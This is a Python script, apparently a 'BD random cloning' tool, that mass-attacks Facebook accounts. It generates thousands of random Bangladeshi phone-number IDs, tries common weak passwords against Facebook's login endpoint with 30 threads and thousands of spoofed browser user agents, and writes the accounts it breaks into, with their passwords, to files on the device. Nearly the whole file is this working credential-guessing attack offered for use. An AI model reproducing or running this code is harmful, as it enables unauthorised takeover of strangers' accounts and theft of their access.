# coding by : MAHADI HASAN AFRIDI
import bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random,zlib,uuid
try:
    import requests
except ImportError:
    print('\n \033[1;97m installing requests !...\n')
    time.sleep(0.5)
    os.system('pip install requests')
import bs4,json,sys,random,datetime,time,re,subprocess,platform,struct,requests
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n  installing bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install bs4')

#----------[COLOR CODE]----------#
A = '\033[1;91m'
B = '\x1b[1;92m'
C = '\x1b[1;93m'
D = '\x1b[1;94m'
E = '\x1b[1;95m'
F = '\x1b[1;96m'
G = '\x1b[1;97m'
H = '\x1b[1;90m'
my_color = [
 A, B, C, D, E, F, G, H]
mahadi = random.choice(my_color)
user = []
loop = 0
ok = []
cp = []
#----------[LOGO]----------#
os.system('clear')
nm =input('\033[1;97m[+]\033[1;92m WHAT IS YOUR NAME : ')
def __mahadi__():
    print(f"""{B}    ____  ___    ______  _____    _   __
   / __ \/   |  /  _/ / / /   |  / | / /
  / /_/ / /| |  / // /_/ / /| | /  |/ /
 / _, _/ ___ |_/ // __  / ___ |/ /|  /
/_/ |_/_/  |_/___/_/ /_/_/  |_/_/ |_/
______________________________________
[+] AUTHOR     \x1b[1;97m: \x1b[1;92mRAIHAN
[+] FACEBOOK   \x1b[1;97m: \x1b[1;92mRAIHAN BBEZ
[+] WHATSAPP   \x1b[1;97m: \x1b[1;92m+8801770220360
[+] STATUS     \x1b[1;97m: \x1b[1;92mBD RANDOM CLONING
[+] TYPE       \x1b[1;97m: \x1b[1;92mFREE
[+] GITHUB     \x1b[1;97m: \x1b[1;92mRAYHAN-CYBER-TEAM
______________________________________""")
def __raihan__():
    os.system('clear')
    __mahadi__()
    print(f'{B}[01] START RANDOM CLONING')
    print('[00] EXIT PROGRAMMING')
    ____enter____= input('[?] SELECT : ')
    if ____enter____ in ['1','01']:
        __random__()
    elif ____enter____ in ['0','00']:
        exit()
    else:
        print('\n\033[1;91m[x] Choose valid option ... ');__raihan__()
        
def __random__():
    user=[]
    os.system('clear')
    __mahadi__()
    print(f'[>] BD SIM CODE \033[1;91m[017, 019, 018, 016]')
    code = input(f'{B}[+] CHOOSE: ')
    limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as __fuck__:
        os.system('clear')
        __mahadi__()
        tl = str(len(user))
        print('\033[1;92m[+] USER NAME\033[1;97m : '+nm)
        print('\033[1;92m[+] TOTAL ID\033[1;97m  : '+tl)
        print('\033[1;92m[+] SIM CODE\033[1;37m  : '+code)
        print('\033[1;92m[+] START BD UID RANDOM CRACKING...')
        print("\033[1;92m______________________________________")
        for vuda in user:
            uid = code+vuda
            pwx = [vuda,uid,'@#@#@#','123098','22334455','Bangladesh','I Love You']
            __fuck__.submit(___uid___,uid,pwx,tl)
    print('')
    input(f"\n\033[1;92m[>] CRACK PROCESS SUCCESSFUL ")
    exit()  

#----------[USERAGENT]----------#
ugen = []
for nt in range(5000):
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    ugen2=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}.1.0; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    ugen.append(ugen2)

for xd in range(1000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku)

    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
    try:
        ua=open('user-agents.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://gist.github.com/pzb/b4b6f57144aea7827ae4').text
        ua=open('.user-agents.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n') 
        ua=open('.user-agents.txt','r').read().splitlines()
        
def ___uid___(uid,pwx,tl):
    global loop
    global ok
    global cp
    global ugen
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\33[1;37m[\x1b[1;92mRAIHAN-XD\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m]  \x1b[1;97m[\x1b[1;92mOK: %s\x1b[1;97m] \x1b[1;97m[\x1b[1;91mCP: %s\x1b[1;97m]'%(loop,len(ok),len(cp))), 
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "next":"https://m.basic.facebook.com/login/device-based/regular/login/?refsrc",
            "flow":"login_no_pain",
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'm.facebook.com',
            "method": 'GET',
            "path": '/?tbua=1',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            "referer": 'https://m.facebook.com/',
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro,}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print(f'\r\033[1;92mRAIHAN-OK '+uid+' | '+ps+ '  ') 
                open('/sdcard/RAIHAN-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\033[1;90mRAIHAN-CP '+cid+' | '+ps+' ')
                    open('/sdcard/RAIHAN-CP.txt', 'a').write(cid+' | '+ps+'\n')
                    cp.append(cid)
                    break
            else:
                continue
        loop+=1
        
    except:
        pass
        
if __name__ == '__main__':
    __raihan__()
